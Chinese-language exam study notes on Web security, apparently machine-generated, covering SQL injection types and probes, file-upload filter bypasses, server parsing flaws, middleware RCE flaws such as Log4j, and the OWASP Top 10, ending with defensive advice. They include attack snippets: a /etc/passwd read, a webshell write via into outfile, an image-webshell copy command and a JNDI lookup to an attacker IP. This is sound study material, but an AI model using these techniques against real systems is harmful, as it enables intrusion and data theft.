# 03 Web 安全基础（高频漏洞概念）

> 对应 10月20日上午：Web 高频漏洞（SQL 注入、文件上传、中间件 RCE）。

## 一、SQL 注入【背】

### 1. 定义一句话

用户输入被**拼接到 SQL 语句**中执行，攻击者构造输入改变 SQL 语义，实现拖库/提权。

### 2. 类型【背】

| 类型 | 特征 | 判断方法 |
| --- | --- | --- |
| 联合注入 | union select 拼接回显 | `and 1=2` 报错位变化，页面直接回显数据 |
| 报错注入 | updatexml/extractvalue 回显 | 页面回显 SQL 报错信息 |
| 布尔注入 | 真/假两种页面 | `and 1=1` 与 `and 1=2` 页面不同 |
| 时间盲注 | sleep 延时判断 | `and sleep(5)` 页面卡 5 秒 |
| 堆叠注入 | 分号执行多语句 | `;insert...`（受中间件限制） |

### 3. 利用链（中高级篇展开）【懂】

```
找注入点 → 判断类型 → 数列数（union select 1,2,3...）→
查库（information_schema.schemata）→ 查表 → 查列 → 拖数据
```

### 4. 核心函数【背】

- `database()`、`version()`、`user()`
- `information_schema`：三大核心表 **schemata（库）、tables（表）、columns（列）**
- 读文件：`load_file('/etc/passwd')`；写文件：`into outfile '/tmp/x.php'`

## 二、文件上传【背】

### 1. 定义一句话

上传功能校验不严，让攻击者上传 **Webshell（脚本木马）** 并能访问执行。

### 2. 绕过方式清单【背】

| 校验方式 | 绕过手段 |
| --- | --- |
| 前端 JS 校验 | 抓包改包（Burp），前端校验等于没有 |
| 黑名单后缀 | 大小写 `.Php`、`php5/php7/phtml`、`.php.`（Windows）、空格、`::$DATA`（Windows 流） |
| 白名单后缀 | `%00` 截断（老版本）、`.htaccess` 解析、配合解析漏洞 |
| MIME 类型 | 抓包改 Content-Type 为 image/jpeg |
| 文件头校验 | 木马前面加图片文件头（图片马：`copy /b a.jpg+b.php x.jpg`） |
| 二次渲染 | 找渲染后保留的代码位 |

### 3. 解析漏洞【懂】

- IIS 6.0：`x.asp;.jpg`、目录名 `xx.asp/` 下任意文件当 asp 执行
- Nginx：老版本 `x.jpg/x.php` 解析为 php（`cgi.fix_pathinfo=1`）
- Apache：`x.php.xxx` 未知后缀向前解析

## 三、中间件 RCE【背】

### 1. 必背组件漏洞对照表

| 中间件/组件 | 漏洞 | 关键词 |
| --- | --- | --- |
| Weblogic | 反序列化 RCE | 端口 7001、/console、T3 协议、CVE-2019-2725 |
| Shiro | rememberMe 反序列化 | Cookie 里 `rememberMe=delete`、AES 密钥爆破 |
| Fastjson | 反序列化 | `@type` 字段、autoType |
| Log4j | JNDI 注入（Log4Shell） | `${jndi:ldap://...}`，2021 年底核弹级 |
| Struts2 | OGNL RCE | S2-045 等，Content-Type 头触发 |

### 2. Log4j 一句话【背】

日志组件把 `${jndi:ldap://攻击者IP/xxx}` 当表达式解析，主动加载远程恶意类执行代码——**特征字符串就是 `${jndi:`**。

## 四、OWASP TOP 10 记忆版【懂】

```
失效的访问控制 → 加密机制失败 → 注入 → 不安全设计 →
安全配置错误 → 自带缺陷和过时的组件 → 身份识别和认证失败 →
软件和数据完整性故障 → 日志监控不足 → SSRF
```

速记：**访问、加密、注入、设计、配置、组件、认证、完整性、日志、SSRF**。

## 五、高频考点提示

1. SQL 注入五类型 + 判断方法对照表必背（联合/报错/布尔/时间/堆叠）。
2. `information_schema` 三张表名（schemata/tables/columns）必背。
3. 文件上传绕过：**前端校验必绕**（抓包改包）、黑名单绕过至少记 4 种。
4. 中间件漏洞记"组件+一句话特征"：Weblogic=7001/console、Shiro=rememberMe、Fastjson=@type、Log4j=${jndi:。
5. 注入防护核心答案：**参数化查询（预编译）+最小权限+过滤转义**，三件套答全才有分。

> AI生成
